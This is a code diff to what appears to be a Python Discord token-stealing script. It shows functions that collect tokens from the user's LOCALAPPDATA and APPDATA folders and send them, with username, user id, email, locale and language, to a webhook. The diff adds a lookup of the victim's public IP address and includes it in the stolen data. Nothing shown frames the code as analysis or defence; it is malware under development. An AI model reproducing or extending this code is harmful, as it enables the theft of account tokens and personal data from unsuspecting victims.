@@ -21,6 +21,8 @@ user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20150626 Firefox/36.
 'Opera/9.63 (X11; Linux x86_64; sl-SI) Presto/2.12.183 Version/12.00']
 user_agent = random.choice(user_agents)
 
+ip_address = get('http://checkip.amazonaws.com').content.decode('utf8')[:-2]
+
 def GetTokens():
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
@@ -161,8 +163,9 @@ def SendTokens(webhook_url, tokens_grabbed = None):
 
         embed[0]['description'] += f'\n```diff\n+ Token Info for\n{token}\n\n'
 
-        embed[0]['description'] += f'''Username = {username}
+        embed[0]['description'] += f'''Username   = {username}
 User Id  = {user_id}
+Ip Address = {ip_address}
 Email    = {email}
 Locale   = {locale}
 Language = {language}'''
